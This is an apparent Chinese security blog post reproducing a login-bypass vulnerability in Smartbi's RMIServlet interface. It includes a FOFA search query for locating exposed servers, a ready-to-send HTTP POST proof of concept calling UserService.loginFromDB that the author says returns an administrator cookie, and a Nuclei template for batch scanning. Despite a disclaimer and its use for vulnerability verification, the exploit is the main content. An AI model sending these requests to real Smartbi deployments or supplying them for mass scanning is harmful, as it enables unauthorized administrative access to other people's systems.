# 原创
：  漏洞复现--Smartbi smartbivisionRMIServlet 接口权限绕过漏洞

# 漏洞复现--Smartbi smartbivisionRMIServlet 接口权限绕过漏洞

## 免责声明：

**文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打马处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行负责**

### 一：漏洞描述

Smartbi大数据分析产品融合BI定义的所有阶段，对接各种业务数据库、数据仓库和大数据分析平台，进行加工处理、分析挖掘和可视化展现，满足所有用户的各种数据分析应用需求，如大数据分析、可视化分析、探索式分析、复杂报表、应用分享等等。该产品存在接口绕过漏洞，攻击者可通过此漏洞绕过登录流程。

### 二：漏洞影响版本

Smartbi

### 三：网络空间测绘查询

fofa<br/> `body="gcfutil = jsloader.resolve('smartbi.gcf.gcfutil')"`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/333238811326047639cdab8bdad02ab6.jpeg"/>

### 四：漏洞复现

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/f3fb432e5fa5bb74bb864e74dbea8b23.jpeg"/><br/> poc:

```
POST /smartbi/vision/RMIServlet HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Content-Length: 68

className=UserService&amp;methodName=loginFromDB&amp;params=["service","0a"]

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/c8a36ae6e773ff988ef97f6363734917.jpeg"/><br/> 获取到的cookie为管理用户，可直接利用进入后台<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/870430d9be051c0796c4bd107e418493.jpeg"/>

### 批量检测

```
id: Smartbi-smartbivisionRMIServlet-interface-permission-bypass 

info:
  name: Smartbi-smartbivisionRMIServlet-interface-permission-bypass 
  author: 芝士土拨鼠
  severity: high
  description: description

requests:
  - raw:
      - |-
        POST /smartbi/vision/RMIServlet HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Content-Type: application/x-www-form-urlencoded
        Accept-Encoding: gzip
        Content-Length: 68

        className=UserService&amp;methodName=loginFromDB&amp;params=["service","0a"]

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'true'
      - type: status
        status:
          - 200

```
